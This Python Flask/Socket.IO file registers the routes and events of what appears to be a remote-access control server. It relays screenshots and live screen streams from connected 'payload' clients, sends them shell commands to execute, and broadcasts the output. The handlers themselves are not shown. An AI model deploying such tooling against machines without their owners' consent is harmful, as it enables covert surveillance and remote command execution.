from flask import request, render_template


def register_socket_io_handlers(socketio, socketio_handler):
    @socketio.on('get_newest_image')
    def get_newest_image():
        socketio_handler.stream_newest_image()

    @socketio.on('request_clients')
    def requesting_clients():
        socketio_handler.request_clients()

    @socketio.on('connect')
    def handle_connect(auth):
        if not socketio_handler.new_connection(auth):
            return False

    @socketio.on('disconnect')
    def test_disconnect():
        socketio_handler.disconnect_client()

    @socketio.on('upload_screenshot')
    def receive_sceenshot(screenshot):
        socketio_handler.receive_screenshot(screenshot)

    @socketio.on('start_live_stream')
    def start_live_stream(of_payload_sid):
        socketio_handler.start_live_stream(of_payload_sid)

    @socketio.on('stop_live_stream')
    def stop_live_stream(of_payload_sid):
        socketio_handler.stop_live_stream(of_payload_sid)

    @socketio.on('execute')
    def executor(of_payload_sid, command):
        socketio_handler.execute(of_payload_sid, command)

    @socketio.on('output_of_command')
    def broadcast_output_of_command(output):
        #ToDo implement a clean way of not broadcasting the output
        #but only send it to the socketio client who requested it
        print("Received execution order successful")
        print("output:")
        print(output)
        socketio_handler.broadcast_output_of_command(output)

def register_http_handlers(app, rest_handler):
    @app.route('/', methods=['GET', 'POST'])
    def receive_screenshot():
        return rest_handler.screenshot_received(request)



    @app.route('/control', methods=['GET', 'POST'])
    def live_stream():
        return render_template('specific_client_view.html')